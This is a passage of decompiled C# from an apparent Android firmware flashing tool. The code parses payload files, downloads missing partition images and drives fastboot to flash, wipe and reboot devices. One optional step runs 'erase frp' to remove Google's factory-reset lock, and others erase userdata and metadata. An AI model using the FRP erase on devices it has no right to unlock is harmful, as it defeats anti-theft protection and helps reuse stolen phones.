						using FileStream fileStream = File.OpenRead(((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1.filePath);
						using SHA256 sHA = SHA256.Create();
						byte[] array = new byte[1048576];
						int num3;
						while ((num3 = fileStream.Read(array, 0, array.Length)) > 0)
						{
							sHA.TransformBlock(array, 0, num3, null, 0);
							((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).readBytes += num3;
							((Control)(object)((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1._003C_003E4__this).Invoke((Delegate)(Action)(() =>
							{
								double num4 = (double)((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).readBytes * 100.0 / (double)((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).totalBytes;
								((UIProcessBar)((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Value = Math.Min((int)(((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).readBytes * 10000 / ((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).totalBytes), 10000);
								((Control)((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1._003C_003E4__this.m_cf).Text = $"校验进度: {num4:F2}%";
							}));
						}
						sHA.TransformFinalBlock(Array.Empty<byte>(), 0, 0);
						return Convert.ToBase64String(sHA.Hash);
					});
					((UIProcessBar)this.m_c1).Value = 10000;
					((Control)this.m_cf).Text = "校验进度: 100.00%";
					if (!(((string)obj13).Trim() == ((string)obj5).Trim()))
					{
						msgred();
						Msg("Erro\n此Payload文件存在不完整，请谨慎使用！\n");
						return;
					}
					fa();
					Msg("OK\n");
				}
				((Payload)this.m_7f)?.Dispose();
				this.m_7f = new Payload(((_003C_003Ec__DisplayClass501_0)obj2).filePath, (string)tmpdir);
				object obj14 = ((Payload)this.m_7f).init();
				if (obj14 != null)
				{
					Msg("初始化失败: " + ((Exception)obj14).Message + "\n");
					return;
				}
				Msg("初始化成功，开始显示分区...\n");
				((DataGridView)this.m_16e).Rows.Clear();
				object enumerator = ((Payload)this.m_7f).manifest.Partitions.GetEnumerator();
				try
				{
					while (((IEnumerator)enumerator).MoveNext())
					{
						object current = ((IEnumerator<PartitionUpdate>)enumerator).Current;
						nint num2 = ((DataGridView)this.m_16e).Rows.Add();
						object obj15 = ((DataGridView)this.m_16e).Rows[(int)num2];
						((DataGridViewRow)obj15).Cells["checke"].Value = true;
						((DataGridViewRow)obj15).Cells["Pname"].Value = ((PartitionUpdate)current).PartitionName;
						((DataGridViewRow)obj15).Cells["Sizestar"].Value = _169(((PartitionUpdate)current).NewPartitionInfo?.Size ?? 0);
						((DataGridViewRow)obj15).Cells["pathfile"].Value = "PayloadInt";
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				Msg("  分区信息:\r\n");
				Msg($"  分区数: {((Payload)this.m_7f).manifest.Partitions.Count}\n");
				long bytes = ((IEnumerable<PartitionUpdate>)((Payload)this.m_7f).manifest.Partitions).Sum((PartitionUpdate p) => (long)(p.NewPartitionInfo?.Size ?? 0));
				Msg("  总大小: " + (string)_16b(bytes) + "\n");
				object fullPath = Path.GetFullPath(Path.GetDirectoryName(((_003C_003Ec__DisplayClass501_0)obj2).filePath) ?? ".");
				((Control)this.m_133).Text = Path.Combine((string)fullPath, "images");
				Directory.CreateDirectory(((Control)this.m_133).Text);
				((CheckBox)this.m_173).Checked = true;
			}
			catch (Exception ex)
			{
				Msg("解析异常: " + ex.Message + "\n");
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private object _169(ulong bytes)
	{
		if (bytes >= 1073741824)
		{
			return $"{bytes / 1073741824} GB";
		}
		if (bytes >= 1048576)
		{
			return $"{bytes / 1048576} MB";
		}
		if (bytes >= 1024)
		{
			return $"{bytes / 1024} KB";
		}
		return $"{bytes} Bytes";
	}

	private async Task _16a(object filepatch)
	{
		object files = Directory.GetFiles((string)filepatch);
		((DataGridView)this.m_16e).Rows.Clear();
		if (((Array)files).Length < 20)
		{
			Msg("镜像包可能不完整。请谨慎刷入！\n");
		}
		else
		{
			nint num = (((IEnumerable<string>)files).Any((string f) => Path.GetFileName(f).Equals("xbl_lp5.img", StringComparison.OrdinalIgnoreCase)) ? 1 : 0);
			if ((int)num != 0)
			{
				DialogResult dialogResult = MessageBox.Show("该刷机包需区分 DDR，请确认 DDR 版本：选择 YES 为 DDR4，NO 为 DDR5", "DDR 选择", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
				object obj = ((dialogResult == DialogResult.Yes) ? "DDR4" : "DDR5");
				Directory.GetFiles((string)filepatch);
				if ((string)obj == "DDR4")
				{
					object obj2 = new string[5] { "xbl_lp5.img", "xbl_config_lp5.img", "xbl_config_ddr5.img", "xbl_ddr5.img", "imagefv_ddr5.img" };
					object obj3 = obj2;
					for (nint num2 = 0; num2 < ((Array)obj3).Length; num2++)
					{
						object path = ((object[])obj3)[num2];
						_1e2(Path.Combine((string)filepatch, (string)path));
					}
					_1e3(Path.Combine((string)filepatch, "imagefv_ddr4.img"), Path.Combine((string)filepatch, "imagefv.img"));
					_1e3(Path.Combine((string)filepatch, "xbl_ddr4.img"), Path.Combine((string)filepatch, "xbl.img"));
					_1e3(Path.Combine((string)filepatch, "xbl_config_ddr4.img"), Path.Combine((string)filepatch, "xbl_config.img"));
				}
				else
				{
					object obj4 = new string[5] { "xbl.img", "xbl_config.img", "xbl_ddr4.img", "xbl_config_ddr4.img", "imagefv_ddr4.img" };
					object obj5 = obj4;
					for (nint num3 = 0; num3 < ((Array)obj5).Length; num3++)
					{
						object path2 = ((object[])obj5)[num3];
						_1e2(Path.Combine((string)filepatch, (string)path2));
					}
					_1e3(Path.Combine((string)filepatch, "xbl_lp5.img"), Path.Combine((string)filepatch, "xbl.img"));
					_1e3(Path.Combine((string)filepatch, "xbl_config_lp5.img"), Path.Combine((string)filepatch, "xbl_config.img"));
					_1e3(Path.Combine((string)filepatch, "imagefv_ddr5.img"), Path.Combine((string)filepatch, "imagefv.img"));
					_1e3(Path.Combine((string)filepatch, "xbl_ddr5.img"), Path.Combine((string)filepatch, "xbl.img"));
					_1e3(Path.Combine((string)filepatch, "xbl_config_ddr5.img"), Path.Combine((string)filepatch, "xbl_config.img"));
				}
				Msg("已完成 DDR 选择处理 (" + (string)obj + ") 的 XBL 分区文件\n");
			}
			files = Directory.GetFiles((string)filepatch);
		}
		object source = new string[6] { "dtbo", "recovery", "boot", "vendor_boot", "bmeta", "lk" };
		object obj6 = new List<FileInfo>();
		object obj7 = new List<FileInfo>();
		object obj8 = new List<FileInfo>();
		nint num4 = 0;
		object obj9 = files;
		for (nint num5 = 0; num5 < ((Array)obj9).Length; num5++)
		{
			object fileName = ((object[])obj9)[num5];
			object obj10 = new FileInfo((string)fileName);
			object fileNameWithoutExtension = Path.GetFileNameWithoutExtension(((FileSystemInfo)obj10).Name);
			if (((string)fileNameWithoutExtension).StartsWith("my", StringComparison.OrdinalIgnoreCase))
			{
				object obj11 = Path.Combine((string)filepatch, "my_preload.img");
				if (!File.Exists((string)obj11))
				{
					num4 = 1;
				}
			}
			if (((IEnumerable<string>)source).Contains((string)fileNameWithoutExtension))
			{
				((List<FileInfo>)obj6).Add((FileInfo)obj10);
			}
			else if ((string)fileNameWithoutExtension == "modem")
			{
				((List<FileInfo>)obj8).Add((FileInfo)obj10);
			}
			else
			{
				((List<FileInfo>)obj7).Add((FileInfo)obj10);
			}
		}
		if ((int)num4 != 0)
		{
			DialogResult dialogResult2 = MessageBox.Show("刷机包缺失双广分区，是否补全分区！(不补全可能无法正常开机!)", "分区补全", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
			if (dialogResult2 == DialogResult.Yes)
			{
				object obj12 = Path.Combine(Path.GetTempPath(), "my.zip");
				object obj13 = "C:\\TMFTool\\my";
				object obj14 = "C:\\TMFTool\\my.zip";
				object url = string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/my.zip");
				Directory.CreateDirectory((string)obj13);
				try
				{
					((UIProcessBar)this.m_c1).Maximum = 100;
					Msg("正在下载所需分区 ...");
					await _111(url, obj14, (Action<int>)((int progress) =>
					{
						((UIProcessBar)this.m_c1).Value = (int)progress;
					}));
					fa();
					Msg("OK\n");
					if (!File.Exists((string)obj14))
					{
						fe("Error\n");
						File.Delete((string)obj14);
						return;
					}
					ZipFile.ExtractToDirectory((string)obj14, (string)obj13);
					File.Delete((string)obj14);
				}
				catch (Exception ex)
				{
					object obj15 = ex;
					msgred();
					Msg("下载失败: " + ((Exception)obj15).Message + "\n");
					return;
				}
				object obj16 = new string[2] { "my_preload.img", "my_company.img" };
				object obj17 = obj16;
				for (nint num6 = 0; num6 < ((Array)obj17).Length; num6++)
				{
					object path3 = ((object[])obj17)[num6];
					object sourceFileName = Path.Combine((string)obj13, (string)path3);
					if (File.Exists((string)sourceFileName))
					{
						object obj18 = Path.Combine((string)filepatch, (string)path3);
						File.Copy((string)sourceFileName, (string)obj18, overwrite: true);
						nint num7 = ((DataGridView)this.m_16e).Rows.Add();
						object obj19 = ((DataGridView)this.m_16e).Rows[(int)num7];
						((DataGridViewRow)obj19).Cells["checke"].Value = true;
						((DataGridViewRow)obj19).Cells["Pname"].Value = Path.GetFileNameWithoutExtension((string)path3);
						((DataGridViewRow)obj19).Cells["Sizestar"].Value = _16b(new FileInfo((string)obj18).Length);
						((DataGridViewRow)obj19).Cells["pathfile"].Value = obj18;
					}
				}
				Msg("补全分区完成\n");
				Directory.Delete((string)obj13, recursive: true);
				File.Delete((string)obj12);
			}
		}
		object obj20 = new List<FileInfo>();
		((List<FileInfo>)obj20).AddRange((IEnumerable<FileInfo>)obj6);
		((List<FileInfo>)obj20).AddRange((IEnumerable<FileInfo>)obj7);
		((List<FileInfo>)obj20).AddRange((IEnumerable<FileInfo>)obj8);
		foreach (FileInfo item in (List<FileInfo>)obj20)
		{
			nint num8 = ((DataGridView)this.m_16e).Rows.Add();
			object obj21 = ((DataGridView)this.m_16e).Rows[(int)num8];
			((DataGridViewRow)obj21).Cells["checke"].Value = true;
			((DataGridViewRow)obj21).Cells["Pname"].Value = Path.GetFileNameWithoutExtension(item.Name);
			((DataGridViewRow)obj21).Cells["Sizestar"].Value = _16b(item.Length);
			((DataGridViewRow)obj21).Cells["pathfile"].Value = item.FullName;
		}
		Msg($"获取的分区数量: {((DataGridView)this.m_16e).Rows.Count}\n");
	}

	private object _16b(long bytes)
	{
		if ((double)bytes >= 1073741824.0)
		{
			return $"{(double)bytes / 1073741824.0:F2} GB";
		}
		if ((double)bytes >= 1048576.0)
		{
			return $"{(double)bytes / 1048576.0:F2} MB";
		}
		if ((double)bytes >= 1024.0)
		{
			return $"{(double)bytes / 1024.0:F2} KB";
		}
		return $"{bytes} 字节";
	}

	private async void _16c(object sender, object e)
	{
		object obj = (object)new VistaFolderBrowserDialog();
		try
		{
			((VistaFolderBrowserDialog)obj).Description = "请选择保存目录或解包好的images目录";
			((VistaFolderBrowserDialog)obj).UseDescriptionForTitle = true;
			((VistaFolderBrowserDialog)obj).ShowNewFolderButton = true;
			if (((CommonDialog)obj).ShowDialog((IWin32Window)this) == DialogResult.OK)
			{
				object selectedPath = ((VistaFolderBrowserDialog)obj).SelectedPath;
				((Control)this.m_133).Text = (string)selectedPath;
				if (this.m_7f == null)
				{
					await _16a(selectedPath);
				}
				else
				{
					Msg("选择新输出目录:" + (string)selectedPath + "\n");
				}
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private void _16d(object output)
	{
		string[] array = ((string)output).Split(new char[2] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
		string[] array2 = array;
		foreach (string text in array2)
		{
			if (text.Contains("partition-size:"))
			{
				string text2 = text.Substring(text.IndexOf(':') + 1).Trim();
				if (text2.Contains(":"))
				{
					text2 = text2.Substring(0, text2.IndexOf(':')).Trim();
				}
				if (text2.Contains("cow"))
				{
					((List<string>)this.m_80).Add(text2);
				}
			}
		}
		if (((List<string>)this.m_80).Count <= 0)
		{
			return;
		}
		foreach (string item in (List<string>)this.m_80)
		{
			Msg(item + "\n");
		}
	}

	private async Task<bool> _16e()
	{
		try
		{
			Msg("等待FastbootD设备连接...");
			object obj = new CancellationTokenSource(TimeSpan.FromSeconds(5.0));
			try
			{
				object obj2 = await _148(((CancellationTokenSource)obj).Token);
				if (string.IsNullOrEmpty((string)obj2))
				{
					msgred();
					fe("超时\n");
					return false;
				}
				Msg("OK\n");
				_16d(obj2);
				return true;
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj3 = ex;
			object msg = "错误: " + ((Exception)obj3).Message;
			Msg((string)msg);
			return false;
		}
	}

	private async Task<bool> _16f(object partition)
	{
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = "C:\\TMFTool\\fastboot.exe",
				Arguments = "delete-logical-partition " + (string)partition,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				((Process)obj).Start();
				object obj2 = (await ((Process)obj).StandardOutput.ReadToEndAsync() + "\n" + await ((Process)obj).StandardError.ReadToEndAsync()).Trim();
				((Process)obj).WaitForExit();
				if (!string.IsNullOrEmpty((string)obj2))
				{
					object obj3 = ((string)obj2).Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
					for (nint num = 0; num < ((Array)obj3).Length; num++)
					{
						object obj4 = ((object[])obj3)[num];
						if (((string)obj4).ToLower().Contains("failed") || ((string)obj4).ToLower().Contains("error"))
						{
							Msg("(" + (string)partition + "): " + (string)obj4 + "\n");
						}
					}
				}
				return ((Process)obj).ExitCode == 0;
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj5 = ex;
			Msg("(" + (string)partition + "): " + ((Exception)obj5).Message + "\n");
			return false;
		}
	}

	private async Task<bool> _170(object command)
	{
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = "C:\\TMFTool\\fastboot.exe",
				Arguments = (string)command,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object CS_0024_003C_003E8__locals8 = new _003C_003Ec__DisplayClass510_0();
			((_003C_003Ec__DisplayClass510_0)CS_0024_003C_003E8__locals8).process = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				((_003C_003Ec__DisplayClass510_0)CS_0024_003C_003E8__locals8).process.Start();
				object obj = (await ((_003C_003Ec__DisplayClass510_0)CS_0024_003C_003E8__locals8).process.StandardOutput.ReadToEndAsync() + "\n" + await ((_003C_003Ec__DisplayClass510_0)CS_0024_003C_003E8__locals8).process.StandardError.ReadToEndAsync()).Trim();
				await Task.Run(() =>
				{
					((_003C_003Ec__DisplayClass510_0)CS_0024_003C_003E8__locals8).process.WaitForExit();
				});
				if (!string.IsNullOrEmpty((string)obj))
				{
					object obj2 = ((string)obj).Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
					for (nint num = 0; num < ((Array)obj2).Length; num++)
					{
						object obj3 = ((object[])obj2)[num];
						if (((string)obj3).ToLower().Contains("failed") || ((string)obj3).ToLower().Contains("error"))
						{
							msgred();
							fe(obj3 ?? "");
						}
					}
				}
				return ((_003C_003Ec__DisplayClass510_0)CS_0024_003C_003E8__locals8).process.ExitCode == 0;
			}
			finally
			{
				if (((_003C_003Ec__DisplayClass510_0)CS_0024_003C_003E8__locals8).process != null)
				{
					((IDisposable)((_003C_003Ec__DisplayClass510_0)CS_0024_003C_003E8__locals8).process).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			object obj4 = ex;
			msgred();
			fe("Fastboot 命令执行失败: " + ((Exception)obj4).Message + "\n");
			return false;
		}
	}

	private void _171(object message)
	{
		string message2 = (string)message;
		if (((Control)this).InvokeRequired)
		{
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				_171(message2);
			}));
			return;
		}
		string text = ((Control)this.m_c8).Text;
		int num = text.LastIndexOf('\n');
		int num2;
		int length;
		if (num >= 0)
		{
			num2 = num + 1;
			length = text.Length - num2;
		}
		else
		{
			num2 = 0;
			length = text.Length;
		}
		((TextBoxBase)this.m_c8).Select(num2, length);
		((TextBoxBase)this.m_c8).SelectedText = message2;
		((TextBoxBase)this.m_c8).SelectionStart = ((TextBoxBase)this.m_c8).TextLength;
		((TextBoxBase)this.m_c8).ScrollToCaret();
	}

	private void _172(object message, object status, Color statusColor)
	{
		string message2 = (string)message;
		string status2 = (string)status;
		if (((Control)this).InvokeRequired)
		{
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				_172(message2, status2, statusColor);
			}));
			return;
		}
		string text = ((Control)this.m_c8).Text;
		int num = text.LastIndexOf('\n');
		int num2;
		int length;
		if (num >= 0)
		{
			num2 = num + 1;
			length = text.Length - num2;
		}
		else
		{
			num2 = 0;
			length = text.Length;
		}
		((TextBoxBase)this.m_c8).Select(num2, length);
		((TextBoxBase)this.m_c8).SelectedText = message2;
		((TextBoxBase)this.m_c8).SelectionStart = ((TextBoxBase)this.m_c8).TextLength;
		((RichTextBox)this.m_c8).SelectionColor = statusColor;
		((TextBoxBase)this.m_c8).AppendText(status2);
		((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
		((TextBoxBase)this.m_c8).AppendText(Environment.NewLine);
		((TextBoxBase)this.m_c8).ScrollToCaret();
	}

	private void _173(object message)
	{
		string message2 = (string)message;
		if (((Control)this).InvokeRequired)
		{
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				_173(message2);
			}));
		}
		else
		{
			((TextBoxBase)this.m_c8).AppendText(message2 + Environment.NewLine);
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	private async Task<bool> _174(object name, object imgPath)
	{
		object CS_0024_003C_003E8__locals25 = new _003C_003Ec__DisplayClass514_0();
		((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25)._003C_003E4__this = this;
		((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).name = (string)name;
		this.m_4c = false;
		((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).isFailed = false;
		((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).headerPrinted = false;
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = "C:\\TMFTool\\fastboot.exe",
				Arguments = "flash " + ((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).name + " \"" + (string)imgPath + "\"",
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object CS_0024_003C_003E8__locals26 = new _003C_003Ec__DisplayClass514_1();
			((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				object value = (DataReceivedEventHandler)((object sender, DataReceivedEventArgs e) =>
				{
					if (!string.IsNullOrEmpty(e.Data))
					{
						string data = e.Data;
						if (data.ToLower().Contains("failed") || data.ToLower().Contains("error"))
						{
							((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).isFailed = true;
							((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25)._003C_003E4__this.msgred();
							((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25)._003C_003E4__this._173("\n" + data);
						}
						else
						{
							Match match = Regex.Match(data, "Sending sparse '([^']+)' (\\d+)/(\\d+)");
							if (match.Success)
							{
								string value2 = match.Groups[1].Value;
								int num = int.Parse(match.Groups[2].Value);
								int num2 = int.Parse(match.Groups[3].Value);
								if (num == 1)
								{
									((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).headerPrinted = true;
								}
								((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25)._003C_003E4__this._171($"[Payload] 刷写 {value2} Sparse [{num}/{num2}]...");
							}
							else if (!((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).headerPrinted)
							{
								((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25)._003C_003E4__this._171("[Payload] 刷写 " + ((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).name + " ...");
								((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).headerPrinted = true;
							}
						}
					}
				});
				((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process.OutputDataReceived += (DataReceivedEventHandler)value;
				((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process.ErrorDataReceived += (DataReceivedEventHandler)value;
				((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process.Start();
				((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process.BeginOutputReadLine();
				((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process.BeginErrorReadLine();
				await Task.Run(() =>
				{
					((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process.WaitForExit();
				});
			}
			finally
			{
				if (((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process != null)
				{
					((IDisposable)((_003C_003Ec__DisplayClass514_1)CS_0024_003C_003E8__locals26).process).Dispose();
				}
			}
			return !((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).isFailed;
		}
		catch (Exception ex)
		{
			object obj = ex;
			_173("执行 fastboot 失败 (" + ((_003C_003Ec__DisplayClass514_0)CS_0024_003C_003E8__locals25).name + "): " + ((Exception)obj).Message);
			return false;
		}
	}

	private void _175(object msg)
	{
		((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
		((TextBoxBase)this.m_c8).AppendText((string)msg);
		((TextBoxBase)this.m_c8).ScrollToCaret();
	}

	private void _176(object msg)
	{
		((RichTextBox)this.m_c8).SelectionColor = Color.Red;
		((TextBoxBase)this.m_c8).AppendText((string)msg);
		((TextBoxBase)this.m_c8).ScrollToCaret();
	}

	private async void _177(object sender, object e)
	{
		object enumerator = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
				nint num = ((((DataGridViewRow)obj).Cells["checke"].Value != null && (bool)((DataGridViewRow)obj).Cells["checke"].Value) ? 1 : 0);
				if (num != 0)
				{
					object obj2 = ((DataGridViewRow)obj).Cells["pathfile"].Value?.ToString();
					if ((string)obj2 == "PayloadInt")
					{
						Msg("请先解包BIn文件进行操作！\n");
						return;
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		nint num2 = ((await _16e()) ? 1 : 0);
		if (num2 == 0)
		{
			return;
		}
		falseButtons();
		if (((List<string>)this.m_80).Count > 0)
		{
			foreach (string item in (List<string>)this.m_80)
			{
				Msg("[Payload] 删除分区: " + item + "...");
				nint num3 = ((await _16f(item)) ? 1 : 0);
				IntPtr intPtr = num3;
				if ((int)(nint)intPtr != 0)
				{
					fa();
					fe("OK\n");
				}
				else
				{
					msgred();
					fe("Error: " + item + "\n");
				}
			}
		}
		else
		{
			Msg("[Payload]升级缓存...");
			fb();
			Msg("Skip\n");
		}
		nint num4 = 0;
		object enumerator3 = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator3).MoveNext())
			{
				object obj3 = (DataGridViewRow)((IEnumerator)enumerator3).Current;
				if (((DataGridViewRow)obj3).Cells["checke"].Value != null && (bool)((DataGridViewRow)obj3).Cells["checke"].Value)
				{
					num4 = 1;
					break;
				}
			}
		}
		finally
		{
			if (enumerator3 is IDisposable disposable2)
			{
				disposable2.Dispose();
			}
		}
		if (num4 == 0)
		{
			Msg("未找选择刷入的分区!\n");
			EnableButtons();
			return;
		}
		if (((Checkbox)this.m_13a).Checked)
		{
			Msg("[Payload] 设置启动分区A...");
			nint num5 = ((await _170("set_active a")) ? 1 : 0);
			IntPtr intPtr2 = num5;
			if ((int)(nint)intPtr2 != 0)
			{
				fa();
				fe("OK\n");
			}
			else
			{
				msgred();
				Msg("Error\n");
			}
		}
		if (((Checkbox)this.m_13b).Checked)
		{
			Msg("[Payload] 擦除谷歌锁...");
			nint num6 = ((await _170("erase frp")) ? 1 : 0);
			IntPtr intPtr3 = num6;
			if ((int)(nint)intPtr3 != 0)
			{
				fa();
				fe("OK\n");
			}
			else
			{
				msgred();
				Msg("Error\n");
			}
		}
		nint num7 = 0;
		nint num8 = 0;
		nint num9 = 0;
		nint num10 = 0;
		((System.Windows.Forms.Timer)this.m_39).Start();
		this.m_3a = (IntPtr)0;
		((Control)this.m_107).Text = $"耗时: {0} 分 {0} 秒";
		((UIProcessBar)this.m_c1).Maximum = ((DataGridView)this.m_16e).Rows.Cast<DataGridViewRow>().Count((DataGridViewRow r) => r.Cells["checke"].Value != null && (bool)r.Cells["checke"].Value);
		((UIProcessBar)this.m_c1).Value = 0;
		object enumerator4 = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator4).MoveNext())
			{
				object obj4 = (DataGridViewRow)((IEnumerator)enumerator4).Current;
				if (((DataGridViewRow)obj4).Cells["checke"].Value == null || !(bool)((DataGridViewRow)obj4).Cells["checke"].Value)
				{
					continue;
				}
				object obj5 = ((DataGridViewRow)obj4).Cells["Pname"].Value?.ToString();
				object obj6 = ((DataGridViewRow)obj4).Cells["pathfile"].Value?.ToString();
				if (string.IsNullOrWhiteSpace((string)obj5) || string.IsNullOrWhiteSpace((string)obj6) || !File.Exists((string)obj6))
				{
					msgred();
					fe("[Skipp] 跳过 " + (string)obj5 + "分区：无效的文件路径!\n");
					continue;
				}
				if (((string)obj5).Equals("lk", StringComparison.OrdinalIgnoreCase))
				{
					num10 = 1;
				}
				if (((string)obj5).StartsWith("my", StringComparison.OrdinalIgnoreCase) && num8 == 0)
				{
					num9 = 1;
					num8 = 1;
					DialogResult dialogResult = MessageBox.Show("当前为欧加设备，是否修复super分区？(不修复可能无法正常刷写动态分区！)", "修复询问", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
					Msg("修复动态分区...");
					if (dialogResult == DialogResult.Yes)
					{
						fa();
						Msg("OK\n");
						await _179();
					}
					else
					{
						fb();
						Msg("Skip\n");
					}
				}
				Msg("[Payload] 刷写 " + (string)obj5 + " ...");
				if (((string)obj5).Equals("modem", StringComparison.OrdinalIgnoreCase))
				{
					if (num7 != 0 && num10 == 0)
					{
						msgred();
						fe("前面含有分区写出现错误，跳过modem刷入!\n");
						continue;
					}
					if (num9 != 0 && num10 == 0)
					{
						Msg("当前欧加高通设备逻辑方式！\n");
						nint num11 = ((await _170("reboot bootloader")) ? 1 : 0);
						IntPtr intPtr4 = num11;
						if ((int)(nint)intPtr4 == 0)
						{
							msgred();
							fe("设备重启到 bootloader 失败，跳过 modem 刷入\n");
							continue;
						}
						fa();
						fe("发送重启Bootloader命令,等待5秒继续\n");
						await Task.Delay(5000);
					}
				}
				nint num12 = ((await _174(obj5, obj6)) ? 1 : 0);
				IntPtr intPtr5 = num12;
				if (this.m_4c)
				{
					Log2("写入已取消\n", Color.Red, isBold: true);
					EnableButtons();
					return;
				}
				if ((int)(nint)intPtr5 != 0)
				{
					_172("[Payload] 刷写 " + (string)obj5 + " ...", "OK", Color.DodgerBlue);
					object obj7 = this.m_c1;
					((UIProcessBar)obj7).Value = ((UIProcessBar)obj7).Value + 1;
					((Control)this.m_cf).Text = $"刷写分区进度: {((UIProcessBar)this.m_c1).Value}/{((UIProcessBar)this.m_c1).Maximum}";
					continue;
				}
				_172("[Payload] 刷写 " + (string)obj5 + " ...", "Error", Color.Red);
				num7 = 1;
				((Control)this.m_cf).Text = "";
				if (((string)obj5).Equals("preloader_raw", StringComparison.OrdinalIgnoreCase))
				{
					fb();
					Msg("MTK 设备如果 " + (string)obj5 + " 分区出错，请无视。\n");
				}
			}
		}
		finally
		{
			if (enumerator4 is IDisposable disposable3)
			{
				disposable3.Dispose();
			}
		}
		((UIProcessBar)this.m_c1).Value = ((UIProcessBar)this.m_c1).Maximum;
		fa();
		Msg("\n操作结束!\n");
		((Control)this.m_cf).Text = "Payload 刷写完成";
		((System.Windows.Forms.Timer)this.m_39).Stop();
		if ((int)(num10 & num9) != 0)
		{
			Msg("欧加 MTK设备请手动格式化用户数据！\n");
		}
		else if (((Checkbox)this.m_130).Checked)
		{
			await Task.Delay(1000);
			Msg("清楚数据...");
			nint num13 = ((await _170("erase userdata")) ? 1 : 0);
			IntPtr intPtr6 = num13;
			if ((int)(nint)intPtr6 != 0)
			{
				fa();
				fe("OK\n");
			}
			else
			{
				msgred();
				Msg("Error\n");
			}
			await Task.Delay(1000);
			nint num14 = ((await _170("erase metadata")) ? 1 : 0);
			IntPtr intPtr7 = num14;
			Msg("清除缓存...");
			if ((int)(nint)intPtr7 != 0)
			{
				fa();
				Msg("OK\n");
			}
			else
			{
				msgred();
				Msg("Error\n");
			}
		}
		if (num7 == 0)
		{
			if (((Checkbox)this.m_139).Checked)
			{
				nint num15 = ((await _170("reboot")) ? 1 : 0);
				IntPtr intPtr8 = num15;
				if ((int)(nint)intPtr8 != 0)
				{
					fa();
					fe("重启设备...OK\n");
				}
